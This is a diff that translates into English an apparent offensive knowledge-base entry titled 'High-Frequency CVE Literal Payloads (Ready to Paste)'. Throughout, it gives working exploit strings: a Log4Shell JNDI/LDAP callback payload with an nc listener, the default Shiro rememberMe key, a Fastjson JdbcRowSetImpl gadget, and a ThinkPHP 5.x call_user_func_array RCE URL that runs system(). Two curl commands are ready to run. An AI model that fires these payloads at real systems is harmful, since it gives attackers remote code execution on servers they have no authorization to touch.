@@ -1,8 +1,8 @@
 {
   "id": "kb055",
-  "title": "高频 CVE 字面 payload（可直接粘贴）",
-  "description": "一击必杀的完整命令——不用现场回忆",
-  "detail": "LOG4SHELL（log4j2，任意 header/参数注入点）：payload ${jndi:ldap://回连IP:1389/x}，走 X-Api-Version 等头，本机 nc -lvnp 1389 收。SHIRO rememberMe：先踩默认老密钥 kPH+bIxk5D2deZiIxcaaaA==（不行就换下表常见键），镜像无 ysoserial 时改走 JNDI。FASTJSON<=1.2.47：POST JSON body 含 @type com.sun.rowset.JdbcRowSetImpl + dataSourceName 指向 ldap 回连 + autoCommit true。THINKPHP 5.x RCE 路径 s=index/think 加 app/invokefunction，function=call_user_func_array，vars[0]=system，vars[1][]=命令（URL 编码空格）。CONFLUENCE 22527：OGNL 模板注入搜公开 payload 直接套。原则：nuclei 先确认版本再放 payload；JNDI 需要出网，不出网看 kb056。",
+  "title": "High-Frequency CVE Literal Payloads (Ready to Paste)",
+  "description": "Complete one-shot commands — no need to recall them on the spot",
+  "detail": "LOG4SHELL (Log4j2; any header/parameter injection point): payload ${jndi:ldap://CALLBACK_IP:1389/x}, send via headers such as X-Api-Version, and listen locally with nc -lvnp 1389. SHIRO rememberMe: first try the old default key kPH+bIxk5D2deZiIxcaaaA== (if it fails, rotate through common keys); if ysoserial is unavailable in the image, switch to JNDI. FASTJSON <= 1.2.47: POST a JSON body containing @type com.sun.rowset.JdbcRowSetImpl + dataSourceName pointing to an LDAP callback + autoCommit true. THINKPHP 5.x RCE path s=index/think plus app/invokefunction, function=call_user_func_array, vars[0]=system, vars[1][]=command (URL-encode spaces). CONFLUENCE 22527: search for a public OGNL template injection payload and apply it directly. Principle: confirm the version with nuclei before launching the payload; JNDI requires outbound access — if there is no outbound access, see kb056.",
   "commands": [
     "curl -s 'http://T/index.php?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'",
     "curl -s http://T/ -H 'X-Api-Version: ${jndi:ldap://YOUR_IP:1389/x}'"
@@ -12,6 +12,6 @@
     "payload",
     "rce"
   ],
-  "source": "审计补强",
+  "source": "audit reinforcement",
   "created_at": "2026-10-17T00:25:00Z"
 }
